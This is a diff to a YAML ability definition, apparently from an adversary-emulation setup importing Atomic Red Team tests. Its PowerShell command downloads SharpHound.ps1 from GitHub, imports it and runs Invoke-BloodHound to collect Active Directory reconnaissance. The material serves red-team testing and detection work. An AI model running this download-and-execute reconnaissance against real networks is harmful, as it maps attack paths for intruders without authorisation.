@@ -18,10 +18,10 @@
         command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1")
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
           -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1"
-          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"; fi; import-module
-          "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"; try { Invoke-BloodHound
-          -OutputDirectory $env:Temp }; catch { $_; exit $_.Exception.HResult}; Start-Sleep
-          5'
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1" -UseBasicParsing;
+          fi; import-module "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1";
+          try { Invoke-BloodHound -OutputDirectory $env:Temp }; catch { $_; exit $_.Exception.HResult};
+          Start-Sleep 5'
         cleanup: Remove-Item $env:Temp\*BloodHound.zip -Force
   plugin: atomic
   singleton: false
@@ -29,8 +29,8 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
   - execution
+  - atomic-red-team
   - t1059.001
   author: Atomic Red Team
   additional_info:
@@ -46,9 +46,9 @@
         -ErrorAction Ignore -Force | Out-Null
 
         Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1"
-        -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
+        -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1" -UseBasicParsing
 
         '
     technique_created: '2020-03-09T13:48:55.078Z'
     atomic_guid: a21bb23e-e677-4ee7-af90-6931b57b6350
-    import_timestamp: '2026-10-20T07:08:27.807738Z'
+    import_timestamp: '2026-10-21T07:01:50.399441Z'
